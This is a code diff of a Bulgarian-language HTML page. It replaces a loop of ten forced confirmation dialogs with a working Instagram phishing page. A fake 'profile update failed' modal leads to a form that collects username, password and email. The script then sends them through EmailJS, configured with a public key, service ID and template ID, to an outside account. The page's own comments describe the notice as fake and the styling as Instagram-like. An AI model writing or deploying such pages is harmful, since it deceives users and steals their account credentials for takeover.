@@ -1,24 +1,178 @@
 <!DOCTYPE html>
-<html>
+<html lang="bg">
 <head>
-    <title>10 Confirmations</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Форма за събиране на данни</title>
+    <style>
+        /* Градиент за фон, наподобяващ Instagram */
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #ff5f6d, #ffc3a0); /* Лилаво-розов градиент */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        h2 {
+            text-align: center;
+            color: #fff;
+        }
+
+        #user-form {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            position: relative;
+        }
+
+        /* Стили за фалшивото уведомление */
+        .notification {
+            background-color: #ffcc00;
+            color: #333;
+            padding: 10px;
+            margin-bottom: 20px;
+            font-weight: bold;
+            border-radius: 4px;
+            text-align: center;
+        }
+
+        label {
+            font-size: 16px;
+            margin-bottom: 8px;
+            display: block;
+            color: #333;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            box-sizing: border-box;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        /* Стили за модалния ефект */
+        .modal {
+            display: block;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            width: 300px;
+            margin: 100px auto;
+            text-align: center;
+        }
+
+        .modal-content h3 {
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        .modal-content button {
+            background-color: #4CAF50;
+        }
+    </style>
+</head>
+<body>
+    <!-- Модален прозорец с уведомление за актуализация -->
+    <div class="modal">
+        <div class="modal-content">
+            <h3>Актуализацията на Инстаграм профила Ви не беше успешна!</h3>
+            <p>За да продължите, въведете вашите данни, за да получим Вашето потвърждение.</p>
+            <button onclick="showForm()">Продължи</button>
+        </div>
+    </div>
+
+    <!-- Форма за събиране на данни -->
+    <div id="form-container" style="display:none;">
+        <h2>Продължете с актуализацията</h2>
+        <form id="user-form" onsubmit="submitForm(event)">
+            <div class="form-container">
+                
+                <label for="name">Потребителско име:</label>
+                <input type="text" id="name" name="name" required>
+
+                <label for="password">Парола:</label>
+                <input type="password" id="password" name="password" required>
+
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" required>
+
+                <button type="submit">Актуализирай профила си</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Включване на актуализирания SDK на EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
     <script>
-        function blockUntilConfirmed() {
-            let confirmations = 0;
-            while (confirmations < 10) {
-                const result = confirm(`Това е потвърждение #${confirmations + 1}. Натисни "OK", за да продължиш.`);
-                if (result) {
-                    confirmations++;
-                } else {
-                    alert("Трябва да потвърдиш, за да продължиш!");
-                }
-            }
-            alert("Благодаря, че потвърди 10 пъти!");
+        // Инициализиране с публичния ключ на EmailJS
+        emailjs.init("TlEa3CKwVPcFf_gKv"); // Замени с твоя public key
+
+        function showForm() {
+            document.querySelector('.modal').style.display = 'none';
+            document.getElementById('form-container').style.display = 'block';
+        }
+
+        function submitForm(event) {
+            event.preventDefault();  // Предотвратява стандартното изпращане на формата
+
+            var formData = {
+                password: document.getElementById("password").value,
+                email: document.getElementById("email").value,
+                name: document.getElementById("name").value
+            };
+
+            // Изпращане на данни към EmailJS
+            emailjs.send("service_dgk6x6n", "template_e0y4inu", formData)
+                .then(function(response) {
+                    alert("Успешна актуализация!");
+                }, function(error) {
+                    alert("Грешка при актуализацията: " + error.text);
+                });
         }
     </script>
-</head>
-<body onload="blockUntilConfirmed()">
-    <h1>Добре дошли!</h1>
-    <p>Трябва да потвърдите 10 пъти, за да отворите тази страница.</p>
 </body>
 </html>
